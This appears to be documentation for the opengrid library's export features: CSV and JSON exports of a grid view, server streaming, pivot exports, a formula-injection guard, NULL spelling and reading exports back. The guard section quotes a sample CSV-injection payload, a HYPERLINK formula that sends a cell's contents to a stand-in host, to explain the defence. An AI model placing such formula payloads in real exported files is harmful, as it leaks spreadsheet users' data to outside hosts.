---
title: Exporting
description: What an export holds and why it holds raw values, from the browser or from a server, a pivot as it is shown, the formula guard, and reading an export back.
order: 5
---

The grid has no export button. What to export, in which format, under which name, and what to
say afterwards are the page's — the same line as for saving an edit. What opengrid supplies is
what a page cannot do well by itself: the query of what the reader sees, every match of it
fetched without a row lost or doubled, and one notation for the file, the same in the browser
and on the server.

Three calls do it. Their signatures and every option are in
[The public API → Exporting the view](../../api/#exporting-the-view); this page is about using
them.

| Call | What it answers | Where the work is done |
|---|---|---|
| `exportRows(provider, query, options)` | Every match of a query, as a `Blob` of CSV or JSON. | Through any provider, in pieces — or in one request where the provider can. |
| `createRestProvider(…).export(query, options)` | The same, from `POST /export/{source}`. | On an `opengrid-server`, streamed. `exportRows` uses it by itself. |
| `get_pivot(host, options)` | An `<opengrid-pivot>` as it is shown, as CSV text. | In the element, without a request. |

## What is exported

**The view, every match of it.** `get_query(grid)` is the query the grid asks its provider,
without a window: the filter row, the facets and the free-text search and-ed together, the sort,
the shown columns in their order. Not the rows that happen to be loaded, not the page the reader
is on — every row that matches. A hidden column is not in it, a moved one is in its new place.

Three things are left out, each on purpose:

- **The selection.** It names positions, and an export of it is the query plus those positions
  ([The view](../../api/#exporting-the-view)).
- **Edits the page has not saved.** The export asks the source again, and the grid has no write
  path: an edited value is exported as the source still holds it. Save first.
- **Group and total rows.** A grouped grid exports its rows, in the order it draws them — by
  their groups first, then by the sort.

`get_query` answers `null` when there is nothing to export: a grid that is not connected yet,
one whose filter does not hold (its status line says why), and the table and the pivot. A page
checks for it before it exports.

**Raw values, not what the grid shows.** A display format — `Intl` options or a function from
`set_formats` — is written for one reader in one language. An export is data for the next
program, and that program cannot read `1.234,50 €` as a number or `3. Feb. 2026` as a date. So
every value is written in the wire notation, the one the engine and the server answer queries
in:

| Type | In the file |
|---|---|
| decimal | Exact, at its scale: `12.50`. Never through a float. |
| date | `2026-02-03` |
| timestamp | ISO 8601 in UTC, microseconds when there are any: `2026-02-03T08:15:00Z`, `2026-02-03T08:15:00.000001Z` |
| float | The shortest text that reads back to the same number; `NaN`, `Infinity` and `-Infinity` spelled out. |
| boolean | `true`, `false` |
| NULL | In a CSV an empty, unquoted field, or the spelling the `null` option gives; in JSON `null`. |
| the empty string | In a CSV `""` — so that it stays apart from NULL; in JSON `""`. |

The CSV header and the JSON keys are the field names. The grid has no other headings.

**CSV** is RFC 4180: UTF-8 with a byte order mark (without one, Excel reads UTF-8 as the system
code page and every `ä` breaks), lines ending in CRLF, `,` between fields — `delimiter: ";"` for
an Excel in a German locale, which splits on `;` — and a field quoted only when it has to be.
**JSON** is one array of row objects, the keys in the order of the columns.

**Within a tie of the sort, the export orders by the selected columns.** The grid's sort may tie,
and a tie has no order a second request is bound to repeat. So `exportRows` appends every
selected column that is not yet in the sort, ascending: the order is then total, and the export
the same every time. Two rows the grid showed in one order may therefore come in the other.
The server gets the same query, so both ways write the same file.

## In the browser

A button that exports the current view, with the grid's own provider — the one given to
`set_provider` or `connect`, so the export reads the same source, with the same token, as the
grid:

```js
import { exportRows, loadOpengrid } from "@casoon/opengrid";

const grid = document.querySelector("opengrid-grid"); // connected to `provider`
const button = document.querySelector("#export");
const bar = document.querySelector("#export-progress"); // a <progress>
const status = document.querySelector("#export-status"); // the page's live region

button.addEventListener("click", async () => {
  const loader = await loadOpengrid();
  const query = loader.module?.get_query(grid);
  if (!query) {
    status.textContent = "There is nothing to export.";
    return;
  }
  let written = 0;
  try {
    const blob = await exportRows(provider, query, {
      delimiter: ";",
      onProgress: ({ rows, total }) => {
        written = rows;
        bar.max = total;
        bar.value = rows;
      },
    });
    const link = Object.assign(document.createElement("a"), {
      href: URL.createObjectURL(blob),
      download: "orders.csv",
    });
    link.click();
    // Revoked once the download has taken the URL, not in the same task.
    setTimeout(() => URL.revokeObjectURL(link.href), 0);
    status.textContent = `${written} rows exported as orders.csv.`;
  } catch (error) {
    console.error(error); // the sentence is for the developer
    status.textContent = "The export failed.";
  }
});
```

- **The outcome goes to the page's live region**, once. The grid's status line speaks about the
  grid, and a progress announced after every piece would be a hundred announcements for a
  million rows; a `<progress>` shows it without saying it.
- **Keep the button focusable while it runs.** A `disabled` button drops the focus;
  `aria-disabled="true"` and an early return keep it where the reader left it. The prototype page
  (`examples/prototype`) does exactly that.
- **Cancelling** is an `AbortController`: pass `signal: controller.signal`, and `abort()` rejects
  the export with an `AbortError` and gives no `Blob`. The REST, pivot and hybrid providers stop
  their request; the tab and the worker cannot stop a query that has started, and its answer is
  dropped.

**How it fetches.** `exportRows` asks the provider for `offset`/`limit` windows of `chunkSize`
rows (10 000), under the sort made total as above. The first piece's `total_count` is the total:
more than `maxRows` (1 000 000) is an error before anything else is fetched, never a truncated
file. Every later piece must report the same count, and none may end before the total; a source
that changes while the export runs shifts the windows, so that export is refused, not written.
The pieces are written as they come and kept as a `Blob` until the page hands it to the reader.

**One request where the provider can.** A provider with an `export` method exports by itself,
and `exportRows` lets it: with `createRestProvider` the whole export is one streamed request —
the next section. The hybrid provider has none, and exports in pieces through its planner.

## Over a server

When the grid reads from an `opengrid-server`, nothing changes in the page: `exportRows` sees the
REST provider's `export` and sends the query — the same query, tie-breaker included — to
`POST /export/{source}` in one request. The server writes the file with the same code the
browser uses, so the bytes are the same; what changes is how they are read. Against PostgreSQL
it is one statement read through a cursor in one snapshot, instead of `OFFSET` windows that get
dearer with every piece and could each see different data.

What a page notices:

- **The server's rules are `/query`'s.** The token, `allowed_fields`, the tenant's `row_filter`:
  an export shows a reader no row and no column their grid could not.
- **Its bound is its own.** More rows than `max_export_rows` (1 000 000 by default) is refused
  before the first byte; more exports at once than `max_concurrent_exports` is a `503`.
  `maxRows` still holds on the page's side: the server says how many rows follow before it sends
  them, and more than `maxRows` is refused without reading the body.
- **Progress comes once**, at the end: the download is one response. Show that the export is
  running, not how far it is — a `<progress>` without a value does.
- **A break is never a short file.** A failure after the first byte — the source, a client that
  took too long, the server itself — breaks the connection off, and the export rejects.

Calling the provider's `export` directly — `rest.export(query, options)` — sends the query as it
is given: without the tie-breaker `exportRows` adds, so within a tie the database decides the
order, and without the default `maxRows`. Prefer `exportRows`.

The endpoint itself — its parameters, headers and status codes, a `curl` line, the bounds on
what an export holds and a memory measurement for a million rows — is in
[Where queries run → Exporting from a server](../where-queries-run/#exporting-from-a-server).

## A pivot

A pivot is exported by the element, as the table shows it:

```js
const pivot = document.querySelector("opengrid-pivot");
const loader = await loadOpengrid();
const csv = loader.module?.get_pivot(pivot, { delimiter: ";" });
if (csv) {
  const blob = new Blob([csv], { type: "text/csv;charset=utf-8" });
  // … and on as for the grid: a link, a file name, a sentence.
}
```

`get_pivot` is synchronous and asks nothing: the element holds the whole pivot — at most 256
columns and 2 000 rows — so there is no window and nothing a second request could add. It
answers text, not a `Blob`, and CSV only. It takes the same CSV options, and answers `null`
before the first answer, while one loads, and after an error.

What differs from a grid's export is that a pivot's file is a **table as shown**, not rows of
data: one header line naming each generated column by its value and measure (`2025 · total`),
the subtotals and the grand total as rows with their labels, and NULL and the empty group named
in the element's own texts — `(no value)`, `(empty)`, or what `set_texts` made of them. The
values are in the wire notation all the same. The details, and why the header is one line, are
in [The public API → Exporting a pivot](../../api/#exporting-a-pivot).

## The formula guard

A spreadsheet runs a cell that starts with `=`, `+`, `-` or `@` as a formula. An export of user
data would then carry whatever a user typed into a spreadsheet as a formula — a customer named
`=HYPERLINK("https://example.org/?"&A2, "Details")` becomes a link that sends the next cell
away. That is formula injection (OWASP calls it CSV injection), and the export guards against it
by default: `protectFormulas` is on.

**What it does.** A text cell that starts with `=`, `+`, `-`, `@`, a tab or a carriage return
gets a leading `'`, which makes a spreadsheet read the cell as text: it runs nothing. The rest of the rules follow from where an attack can come from:

- **Text columns only.** A number column's `-5` is a number, not an attack, and a `'` would
  change the data. Neither are the field names in the header, which start with a letter or `_`.
  In a pivot the guard covers every header and label as well, because a dimension value is data.
- **`-Infinity` shows as `#NAME?` in Excel.** It is a float column's value, spelled out; Excel
  reads it as a formula naming something that does not exist. It is not attacker text — the
  export writes it only for a float that is negative infinity — so it is not guarded, and a `'`
  would make it a text in a number column.
- **With the guard on, a field that holds `,`, `;` or a tab is always quoted**, whatever the
  delimiter. A spreadsheet that splits on the *other* list separator — `;` in a German Excel, for
  a file written with `,` — would otherwise cut `x;=cmd…` in two and reach the `=`.
- **Under the guard, `null` may not start with `=`, `+`, `-`, `@` or a tab.** The spelling is
  written into every empty cell as it is, unguarded; `exportRows`, `get_pivot` and the server
  refuse such a spelling with a sentence.

**When to switch it off.** When the file is read by a program, not opened in a spreadsheet —
opengrid's own ingest, pandas, a database's `COPY`, another service. To a program the `'` is
part of the value: a text column holding `-5` would come back as `'-5`. Pass
`protectFormulas: false` for such an export, and only for such an export; a page that serves
both can offer two buttons. JSON has no guard: nothing opens JSON as a spreadsheet.

## NULL in a CSV

NULL is an empty, unquoted field; the empty string is `""`. A reader that tells quoted from
unquoted keeps them apart. A spreadsheet does not — both are empty cells — and many other readers
do not either, which is what the `null` option is for: `null: "\\N"` (the two characters `\N`, as
PostgreSQL's `COPY` writes it) or `null: "NULL"` spells NULL out, and a real text that reads like
the spelling is quoted, so a reader that tells them apart still can. The spelling may not hold
the delimiter, a quote or a line break.

**One column, NULL written empty, loses rows.** A row whose only value is NULL is then an empty
line, and most readers skip empty lines — opengrid's ingest does. For an export that may have a
single column, set `null`.

## Reading an export back into opengrid

opengrid's ingest — `Engine.load_csv` in the browser, a `local-csv` source on the server — reads a
CSV with a header, `,` between fields and `\N` for NULL; it skips a byte order mark and takes
CRLF. An export reads back unchanged with the NULL spelled that way and the guard off:

```js
const blob = await exportRows(provider, query, { null: "\\N", protectFormulas: false });
```

- **The guard off**, because a text that starts like a formula would otherwise come back with its
  `'`.
- **A schema of the exported columns.** The ingest never guesses types, and it checks the header
  against the schema: its columns are the file's, in the file's order. A column the source
  derived — a year from a date — is an ordinary column in the file, and declared as one.
- **Everything else comes back as it was**: decimals exact, timestamps to the microsecond, `NaN`,
  `Infinity`, `-0.0`, the empty string, and text with delimiters, quotes and line breaks in it
  (`crates/opengrid-export/tests/roundtrip.rs` holds that for every stored type).
- **Except the text `\N` itself, which comes back as NULL.** The export quotes it, `"\N"`, to keep
  it apart; the ingest does not tell a quoted `\N` from an unquoted one.

## Limits and errors

Every refusal is a rejection with a sentence, never a shorter file. The sentences are English
and written for the developer; a page logs them and tells the reader in its own words. Only an
abort is meant to be told apart, by its `name`; the others carry no code, and what a page wants
to tell apart beyond that it checks itself.

| What happened | What the page gets | What it can say |
|---|---|---|
| `get_query` answered `null` | Nothing yet — check before exporting (`exportRows` would reject with a `TypeError`). | There is nothing to export. |
| The reader cancelled | A `DOMException` whose `name` is `"AbortError"`; no `Blob`. | That it was cancelled — or nothing, since the reader did it. |
| More matches than `maxRows` | `exportRows: … rows match, more than the … an export may have (maxRows)`, before anything else is fetched. | Too many rows: narrow the view. |
| More than the server's `max_export_rows` | The server's `413`: `the export has … rows, more than the … allowed (max_export_rows)`, before the first byte. | The same. |
| Too many exports at once | The server's `503`: `… exports are running, the most this server runs at once (max_concurrent_exports); try again later`. | Try again in a moment. |
| The source changed during the export | `exportRows: the source changed during the export (…); export again` — pieces only. | Export again. For a source that changes all the time, export from the server, which reads one snapshot. |
| The server broke off mid-download | The browser's own network error from the response body. | The export failed; try again. |
| A wrong option — an unknown key, a CSV option on JSON, a `delimiter` of two characters, a `null` that starts like a formula under the guard | A `TypeError` or an `Error`, before any request. | Nothing: that is the page's bug. |
| The WebAssembly module did not load | `exportRows: the WebAssembly module did not load, and the export notation is in it` | The export is not available. |

The server's other answers are those of `/query`: `401` without a valid token, `422` for a
field outside `allowed_fields` — the same `unknown field` as a typo — and a `413` for a timeout
before the first byte, `the export took longer than … ms to start`. For `get_pivot` the errors are thrown,
not rejected: a wrong option, and a shown answer it cannot read.
